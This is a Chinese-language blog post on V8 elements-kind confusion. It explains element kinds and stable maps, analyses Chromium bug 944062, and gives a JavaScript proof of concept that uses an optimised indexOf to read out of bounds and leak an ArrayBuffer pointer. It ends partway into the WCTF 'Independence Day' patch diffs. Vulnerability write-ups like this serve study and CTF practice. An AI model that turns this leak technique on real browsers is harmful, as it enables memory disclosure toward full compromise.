@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>v8-Element Kind Confusion | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="v8," />
+  
+
+  <meta name="description" content="v8">
+<meta name="keywords" content="v8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="v8-Element Kind Confusion">
+<meta property="og:url" content="http://yoursite.com/2019/08/05/v8-JIT-Element Kind Confusion/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="v8">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/Element%20Kind%20Confusion/element.png">
+<meta property="og:updated_time" content="2019-09-23T07:21:06.129Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="v8-Element Kind Confusion">
+<meta name="twitter:description" content="v8">
+<meta name="twitter:image" content="http://yoursite.com/Element%20Kind%20Confusion/element.png">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Element-Kind："><span class="toc-text">Element Kind：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stable-Map："><span class="toc-text">Stable Map：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUG-944062："><span class="toc-text">BUG 944062：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WCTF-Independence-Day："><span class="toc-text">WCTF Independence Day：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC："><span class="toc-text">POC：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference："><span class="toc-text">Reference：</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-v8-JIT-Element Kind Confusion" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">v8-Element Kind Confusion</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.08.05</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>好久没有更新文章了，主要是自己懒加上时间没有那么充裕了，现在抽空来写一写v8的一些东西。</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>最近看了一些<code>Element Kind Confusion</code>的知识点，还有一道<code>WCTF</code>上的题。现在写一下一些比较有意思的知识点。主要参考PGZ的一篇博文。</p>
+<h3 id="Element-Kind："><a href="#Element-Kind：" class="headerlink" title="Element Kind："></a>Element Kind：</h3><p>先看定义：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">enum ElementsKind &#123;</span><br><span class="line">  // The &quot;fast&quot; kind for elements that only contain SMI values. Must be first</span><br><span class="line">  // to make it possible to efficiently check maps for this kind.</span><br><span class="line">  PACKED_SMI_ELEMENTS,</span><br><span class="line">  HOLEY_SMI_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  // The &quot;fast&quot; kind for tagged values. Must be second to make it possible to</span><br><span class="line">  // efficiently check maps for this and the PACKED_SMI_ELEMENTS kind</span><br><span class="line">  // together at once.</span><br><span class="line">  PACKED_ELEMENTS,</span><br><span class="line">  HOLEY_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  // The &quot;fast&quot; kind for unwrapped, non-tagged double values.</span><br><span class="line">  PACKED_DOUBLE_ELEMENTS,</span><br><span class="line">  HOLEY_DOUBLE_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  // The &quot;slow&quot; kind.</span><br><span class="line">  DICTIONARY_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  // Elements kind of the &quot;arguments&quot; object (only in sloppy mode).</span><br><span class="line">  FAST_SLOPPY_ARGUMENTS_ELEMENTS,</span><br><span class="line">  SLOW_SLOPPY_ARGUMENTS_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  // For string wrapper objects (&quot;new String(&apos;...&apos;)&quot;), the string&apos;s characters</span><br><span class="line">  // are overlaid onto a regular elements backing store.</span><br><span class="line">  FAST_STRING_WRAPPER_ELEMENTS,</span><br><span class="line">  SLOW_STRING_WRAPPER_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  // Fixed typed arrays.</span><br><span class="line">  UINT8_ELEMENTS,</span><br><span class="line">  INT8_ELEMENTS,</span><br><span class="line">  UINT16_ELEMENTS,</span><br><span class="line">  INT16_ELEMENTS,</span><br><span class="line">  UINT32_ELEMENTS,</span><br><span class="line">  INT32_ELEMENTS,</span><br><span class="line">  FLOAT32_ELEMENTS,</span><br><span class="line">  FLOAT64_ELEMENTS,</span><br><span class="line">  UINT8_CLAMPED_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  // Sentinel ElementsKind for objects with no elements.</span><br><span class="line">  NO_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  // Derived constants from ElementsKind.</span><br><span class="line">  FIRST_ELEMENTS_KIND = PACKED_SMI_ELEMENTS,</span><br><span class="line">  LAST_ELEMENTS_KIND = UINT8_CLAMPED_ELEMENTS,</span><br><span class="line">  FIRST_FAST_ELEMENTS_KIND = PACKED_SMI_ELEMENTS,</span><br><span class="line">  LAST_FAST_ELEMENTS_KIND = HOLEY_DOUBLE_ELEMENTS,</span><br><span class="line">  FIRST_FIXED_TYPED_ARRAY_ELEMENTS_KIND = UINT8_ELEMENTS,</span><br><span class="line">  LAST_FIXED_TYPED_ARRAY_ELEMENTS_KIND = UINT8_CLAMPED_ELEMENTS,</span><br><span class="line">  TERMINAL_FAST_ELEMENTS_KIND = HOLEY_ELEMENTS</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>主要用前七种，后面的先不考虑。</p>
+<p>先分为<code>fast</code>和<code>slow</code>两大类，<code>fast</code>作为快速查找，线性查找，<code>slow</code>慢速查找，即用字典方式查找。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,1,1,1];</span><br></pre></td></tr></table></figure>
+<p>这种是属于<code>fast</code>类，<code>PACKED_SMI_ELEMENTS</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0xfafc08b2c9: [JSArray]</span><br><span class="line"> - map: 0x082a549c2e69 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x10373c151809 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x00fafc08b269 &lt;FixedArray[4]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br></pre></td></tr></table></figure>
+<p>再看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a[10000] = 1;</span><br><span class="line"></span><br><span class="line">DebugPrint: 0xfafc08b2c9: [JSArray]</span><br><span class="line"> - map: 0x082a549ca6b9 &lt;Map(DICTIONARY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x10373c151809 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x00fafc08da41 &lt;NumberDictionary[28]&gt; [DICTIONARY_ELEMENTS]</span><br></pre></td></tr></table></figure>
+<p>就变成了<code>slow</code>，<code>DICTIONARY_ELEMENTS</code>。</p>
+<p><code>fast</code>类还可以分，可以单向转化。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,1,1,1];</span><br><span class="line">a[0] = [1.1];</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x20f9d8dedf01: [JSArray]</span><br><span class="line"> - map: 0x082a549c2fa9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x10373c151809 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20f9d8dee341 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br></pre></td></tr></table></figure>
+<p>此时就变成了<code>PACKED_DOUBLE_ELEMENTS</code>。</p>
+<p>再往下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,1,1,1];</span><br><span class="line">a[0] = &#123;x:1&#125;;</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x20f9d8dedf01: [JSArray]</span><br><span class="line"> - map: 0x082a549c3049 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x10373c151809 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20f9d8dee721 &lt;FixedArray[4]&gt; [PACKED_ELEMENTS]</span><br></pre></td></tr></table></figure>
+<p>又转化成了<code>PACKED_ELEMENTS</code>。这里就相当于是对象数组，后面就无法继续转化了，而且以上三个之间只能按照我写的顺序转化，类型无法退回。</p>
+<p>再来看另一种的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,1,1,1];</span><br><span class="line">a[10] = 1;</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x20f9d8deef81: [JSArray]</span><br><span class="line"> - map: 0x082a549c2f59 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x10373c151809 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20f9d8def2c9 &lt;FixedArray[32]&gt; [HOLEY_SMI_ELEMENTS]</span><br></pre></td></tr></table></figure>
+<p>这就从<code>PACKED</code>类转化成了<code>HOLEY</code>类。之后的<code>Double</code>、<code>tagged point</code>都跟上面三种转化一样。用官方文档的图来表示就是：</p>
+<p><img src="/Element Kind Confusion/element.png" alt="element"></p>
+<p>只能单向转化。</p>
+<h3 id="Stable-Map："><a href="#Stable-Map：" class="headerlink" title="Stable Map："></a>Stable Map：</h3><p>Maps are marked stable when the code to access their elements is already optimized.</p>
+<p>当一个对象新添加一个属性的时候，他的<code>map</code>就会发生变化，比如从一个空对象添加一个属性就会从<code>map0</code>到<code>map1</code>的过程此时，<code>map1</code>就会被标记为<code>stable map</code>，当再添加一个属性时<code>map2</code>就为<code>stable map</code>，<code>map1</code>不再是<code>stable map</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var a = [1];</span><br><span class="line">a.x = 1;</span><br><span class="line"></span><br><span class="line">0x82a549ca7a9: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_SMI_ELEMENTS</span><br><span class="line"> - unused property fields: 2</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map                       &lt;------</span><br><span class="line"> - back pointer: 0x082a549c2e69 &lt;Map(PACKED_SMI_ELEMENTS)&gt;</span><br></pre></td></tr></table></figure>
+<p>再来就先开始看PGZ的<code>bug944062</code>的洞：</p>
+<h3 id="BUG-944062："><a href="#BUG-944062：" class="headerlink" title="BUG 944062："></a>BUG 944062：</h3><p>漏洞函数出现在<code>indexOf</code>和<code>include</code>函数，在这里，（<code>JSCallReducer</code>）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// For search_variant == kIndexOf:</span><br><span class="line">// ES6 Array.prototype.indexOf(searchElement[, fromIndex])</span><br><span class="line">// #sec-array.prototype.indexof</span><br><span class="line">// For search_variant == kIncludes:</span><br><span class="line">// ES7 Array.prototype.inludes(searchElement[, fromIndex])</span><br><span class="line">// #sec-array.prototype.includes</span><br><span class="line">Reduction JSCallReducer::ReduceArrayIndexOfIncludes(</span><br><span class="line">   SearchVariant search_variant, Node* node) &#123;</span><br><span class="line"> CallParameters const&amp; p = CallParametersOf(node-&gt;op());</span><br><span class="line"> if (p.speculation_mode() == SpeculationMode::kDisallowSpeculation) &#123;</span><br><span class="line">   return NoChange();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> Node* receiver = NodeProperties::GetValueInput(node, 1);</span><br><span class="line"> Node* effect = NodeProperties::GetEffectInput(node);</span><br><span class="line"> Node* control = NodeProperties::GetControlInput(node);</span><br><span class="line"></span><br><span class="line"> ZoneHandleSet&lt;Map&gt; receiver_maps;</span><br><span class="line"> NodeProperties::InferReceiverMapsResult result =</span><br><span class="line">     NodeProperties::InferReceiverMaps(broker(), receiver, effect,</span><br><span class="line">                                       &amp;receiver_maps);</span><br><span class="line"> if (result == NodeProperties::kNoReceiverMaps) return NoChange();</span><br></pre></td></tr></table></figure>
+<p>这里的<code>result == NodeProperties::kNoReceiverMaps</code>。再看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enum InferReceiverMapsResult &#123;</span><br><span class="line">  kNoReceiverMaps,         // No receiver maps inferred.</span><br><span class="line">  kReliableReceiverMaps,   // Receiver maps can be trusted.</span><br><span class="line">  kUnreliableReceiverMaps  // Receiver maps might have changed (side-effect),</span><br><span class="line">                           // but instance type is reliable.</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>有这么几种。这里的<code>kUnreliableReceiverMaps</code>指的就是<code>array</code>可以从<code>float element</code>转变到<code>dictionary element</code>，是不可靠的，有<code>side-effect</code>。</p>
+<p>而在上面<code>ReduceArrayIndexOfIncludes</code>当中，对于<code>kUnreliableReceiverMaps</code>在<code>lowering</code>过程中是没有<code>checkmap</code>或者<code>StableMapDependency</code>的，也就是说，当我们在<code>lowering</code>之前把<code>element kind</code>改为<code>dictionary element</code>（<code>fast</code>-&gt;<code>dictionary</code>）。就会触发<code>bug</code>。</p>
+<p>我们再来看一下<code>arrayIndexOf lowering</code>之后的状态：</p>
+<p>他是个<code>builtin</code>内置函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TF_BUILTIN(ArrayIncludesHoleyDoubles, ArrayIncludesIndexofAssembler) &#123;</span><br><span class="line">  Node* elements = Parameter(Descriptor::kElements);</span><br><span class="line">  Node* search_element = Parameter(Descriptor::kSearchElement);</span><br><span class="line">  Node* array_length = Parameter(Descriptor::kLength);</span><br><span class="line">  Node* from_index = Parameter(Descriptor::kFromIndex);</span><br><span class="line"></span><br><span class="line">  GenerateHoleyDoubles(kIncludes, elements, search_element, array_length,</span><br><span class="line">                       from_index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>往下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void ArrayIncludesIndexofAssembler::GenerateSmiOrObject(</span><br><span class="line">    SearchVariant variant, Node* context, Node* elements, Node* search_element,</span><br><span class="line">    Node* array_length, Node* from_index) &#123;</span><br><span class="line">  VARIABLE(index_var, MachineType::PointerRepresentation(),</span><br><span class="line">           SmiUntag(from_index));</span><br><span class="line">  VARIABLE(search_num, MachineRepresentation::kFloat64);</span><br><span class="line">  Node* array_length_untagged = SmiUntag(array_length);</span><br><span class="line">  </span><br><span class="line">  ------</span><br><span class="line">  </span><br><span class="line">    BIND(&amp;ident_loop);</span><br><span class="line">  &#123;</span><br><span class="line">    GotoIfNot(UintPtrLessThan(index_var.value(), array_length_untagged),</span><br><span class="line">              &amp;return_not_found);</span><br><span class="line">    Node* element_k =</span><br><span class="line">        UnsafeLoadFixedArrayElement(CAST(elements), index_var.value());</span><br><span class="line">    GotoIf(WordEqual(element_k, search_element), &amp;return_found);</span><br><span class="line"></span><br><span class="line">    Increment(&amp;index_var);</span><br><span class="line">    Goto(&amp;ident_loop);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>继续往下后会发现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">template &lt;typename Array, typename T&gt;</span><br><span class="line">TNode&lt;T&gt; CodeStubAssembler::LoadArrayElement(TNode&lt;Array&gt; array,</span><br><span class="line">                                             int array_header_size,</span><br><span class="line">                                             Node* index_node,</span><br><span class="line">                                             int additional_offset,</span><br><span class="line">                                             ParameterMode parameter_mode,</span><br><span class="line">                                             LoadSensitivity needs_poisoning) &#123;</span><br><span class="line">  CSA_ASSERT(this, IntPtrGreaterThanOrEqual(</span><br><span class="line">                       ParameterToIntPtr(index_node, parameter_mode),</span><br><span class="line">                       IntPtrConstant(0)));</span><br><span class="line">  DCHECK(IsAligned(additional_offset, kTaggedSize));</span><br><span class="line">  int32_t header_size = array_header_size + additional_offset - kHeapObjectTag;</span><br><span class="line">  TNode&lt;IntPtrT&gt; offset = ElementOffsetFromIndex(index_node, HOLEY_ELEMENTS,</span><br><span class="line">                                                 parameter_mode, header_size);</span><br><span class="line">  CSA_ASSERT(this, IsOffsetInBounds(offset, LoadArrayLength(array),</span><br><span class="line">                                    array_header_size));</span><br><span class="line">  constexpr MachineType machine_type = MachineTypeOf&lt;T&gt;::value;</span><br><span class="line">  // TODO(gsps): Remove the Load case once LoadFromObject supports poisoning</span><br><span class="line">  if (needs_poisoning == LoadSensitivity::kSafe) &#123;</span><br><span class="line">    return UncheckedCast&lt;T&gt;(LoadFromObject(machine_type, array, offset));</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return UncheckedCast&lt;T&gt;(Load(machine_type, array, offset, needs_poisoning));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该函数是线性访问<code>array</code>的内容了。</p>
+<p>如果在此之前我们将他改为<code>dictionary element</code>，就会造成<code>out-of-read</code>了。</p>
+<p>构造利用<code>out-of-read</code>的过程是先构造<code>array</code>再构造<code>arraybuffer</code>，再用一些<code>search value</code>结尾控制搜索边界，搜索内容就是<code>arraybuffer</code>的<code>backing_store</code>指针。可以使用<code>smi</code>类型爆破高二位字节，这样可以增高效率。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">let b = false;</span><br><span class="line">let array = [Array, 1.2];</span><br><span class="line">let ab = undefined;</span><br><span class="line">findme = undefined;</span><br><span class="line">function f(to_search) &#123;</span><br><span class="line">  if (b) &#123;</span><br><span class="line">    array[100000] = 1.1;</span><br><span class="line">    if (b == 1) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    ab = new ArrayBuffer(1&lt;&lt;30);</span><br><span class="line">    //%DebugPrint(ab);</span><br><span class="line">    findme = [0x1337, to_search];</span><br><span class="line">  &#125;;</span><br><span class="line">  return to_search;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">%NeverOptimizeFunction(f);</span><br><span class="line">function foo(to_search) &#123;</span><br><span class="line">  return array.indexOf(f(to_search), 20);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(foo(0x1337));</span><br><span class="line">foo(0x1337);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(foo(0x1337));</span><br><span class="line">b = true;</span><br><span class="line">print(foo(0x1337));</span><br></pre></td></tr></table></figure>
+<p>这可以作为泄露示范。</p>
+<p>再来看<code>WCTF</code>上的题。</p>
+<h3 id="WCTF-Independence-Day："><a href="#WCTF-Independence-Day：" class="headerlink" title="WCTF Independence Day："></a>WCTF Independence Day：</h3><p>先看<code>Patch</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/objects/code.cc b/src/objects/code.cc</span><br><span class="line">index 24817ca65c..4079f6077d 100644</span><br><span class="line">--- a/src/objects/code.cc</span><br><span class="line">+++ b/src/objects/code.cc</span><br><span class="line">@@ -925,6 +925,7 @@ void DependentCode::InstallDependency(Isolate* isolate,</span><br><span class="line">                                       const MaybeObjectHandle&amp; code,</span><br><span class="line">                                       Handle&lt;HeapObject&gt; object,</span><br><span class="line">                                       DependencyGroup group) &#123;</span><br><span class="line">+#if 0</span><br><span class="line">   Handle&lt;DependentCode&gt; old_deps(DependentCode::GetDependentCode(object),</span><br><span class="line">                                  isolate);</span><br><span class="line">   Handle&lt;DependentCode&gt; new_deps =</span><br><span class="line">@@ -932,6 +933,7 @@ void DependentCode::InstallDependency(Isolate* isolate,</span><br><span class="line">   // Update the list head if necessary.</span><br><span class="line">   if (!new_deps.is_identical_to(old_deps))</span><br><span class="line">     DependentCode::SetDependentCode(object, new_deps);</span><br><span class="line">+#endif</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> Handle&lt;DependentCode&gt; DependentCode::InsertWeakCode(</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">commit 3794e5f0eeee3d421cc0d2a8d8b84ac82d37f10d</span><br><span class="line">Author: Your Name &lt;you@example.com&gt;</span><br><span class="line">Date:   Sat Dec 15 18:21:08 2018 +0100</span><br><span class="line"></span><br><span class="line">    strip global in realms</span><br><span class="line"></span><br><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index 98bc56ad25..e72f528ae5 100644</span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ -1043,9 +1043,8 @@ MaybeLocal&lt;Context&gt; Shell::CreateRealm(</span><br><span class="line">     